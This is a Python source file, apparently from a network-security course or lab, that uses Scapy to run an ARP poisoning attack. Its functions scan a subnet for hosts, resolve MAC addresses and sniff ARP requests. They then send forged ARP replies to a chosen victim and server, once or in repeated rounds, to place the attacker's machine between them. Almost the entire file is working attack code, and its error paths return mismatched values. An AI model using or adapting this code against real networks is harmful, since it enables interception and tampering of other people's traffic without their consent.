import scapy.all as sc;
import argparse;
import time;
import ipaddress;


### This is the file for ARP poisoning. 
# first listen to ARP broadcast, then send victim and server arp responses and hope that we are the quickest.

# Scanning network for devices, this returns (or is supposed to return) all live hosts in a given range 'ip'.
def network_scan(ip_range, batch_threshold=256):
    hosts = []
    try:
        network = ipaddress.ip_network(ip_range, strict=False)
        
        if network.num_addresses <= batch_threshold:
            hosts.extend(_scan_single_range(str(network)))
        else:
            new_prefix = max(24, network.prefixlen)
            for subnet in network.subnets(new_prefix=new_prefix):
                print(f"Scanning {subnet}...")
                hosts.extend(_scan_single_range(str(subnet)))
    except ValueError as e:
        print(f"[!] Invalid IP range: {ip_range} - {e}")
    return hosts

#scan a single network range
def _scan_single_range(ip):
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / arp
    packet_pairs = sc.srp(final_packet, timeout=2, verbose=False)[0]
    hosts = []
    for sent, received in packet_pairs:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    return hosts

## Here is where the main parts of the ARP poisoning is supposed to happen. 
# 1. We need to be able to start the poisoning attack.
# 2. We need to be able to get a current MAC adress. 


# (2.) Get the MAC adress of a given IP adress
def get_mac(ip):
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp
    answered = sc.srp(packet, timeout=2, verbose=False, iface="enp0s3")[0]
    for _, received in answered:
        return received.hwsrc
    return None

#do the poisoning
def arp_poisoning(victim_ip, server_ip, mode):
    iface = "enp0s3"
    attacker_mac = sc.get_if_hwaddr(iface)
    victim_mac = None
    server_mac = None

    try:
        # wait for arp broadcast from client
        if victim_ip and not server_ip:
            print("Waiting for ARP from victim to discover server IP...")
            pkt = sc.sniff(filter="arp", iface=iface, store=1,
                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip)[0]
            server_ip = pkt[sc.ARP].pdst
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)

        # wait for any arp broadcast
        elif not victim_ip and not server_ip:
            print("[Waiting for any ARP broadcast to discover both IPs...")
            pkt = sc.sniff(filter="arp", iface=iface, store=1,
                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].op == 1)[0]
            victim_ip = pkt[sc.ARP].psrc
            server_ip = pkt[sc.ARP].pdst
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)

        #get mac addresses from given IP's
        else:
            victim_mac = get_mac(victim_ip)
            server_mac = get_mac(server_ip)
            print("Waiting for ARP broadcast from victim")
            pkt = sc.sniff(filter="arp", iface=iface, store=1,
                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip and p[sc.ARP].pdst == server_ip)[0]

        if not victim_mac or not server_mac:
            print("[!] Could not resolve MAC addresses.")
            return None, None

        # create the fake responses
        fake_packet_victim = sc.Ether(dst=victim_mac) / sc.ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
        fake_packet_server = sc.ARP(op=2, pdst=server_ip, psrc=victim_ip, hwsrc=attacker_mac)

        #send the responses
        if mode == "silent":
            print("Silent mode: sending one-time ARP poison")
            sc.sendp(fake_packet_victim, iface=iface, verbose=False)
        else:
            print("Allout mode: sending ARP poison repeatedly")
            for i in range(5):
                sc.sendp(fake_packet_victim, iface=iface, verbose=False)
                print(f"  [>] Poisoning round {i+1}")
                time.sleep(0.5)
        sc.send(fake_packet_server, iface=iface, verbose=False)
        return server_mac, victim_mac, server_ip, victim_ip

    except Exception as e:
        print(f"[!] Error during ARP poisoning: {e}")
        return None, None
    

# helper functions to filter packet sniffs
def check_arp_server_client(pkt, server_ip, client_ip):
    if pkt.haslayer(sc.ARP):
        arp = pkt[sc.ARP]
        if arp.op == 1 and arp.psrc == client_ip and arp.pdst == server_ip:
            return True
    return False

def check_arp_client(pkt,client_ip):

    if pkt.haslayer(sc.ARP):
        arp = pkt[sc.ARP]
        if arp.op == 1 and arp.psrc == client_ip:
            return True
    return False
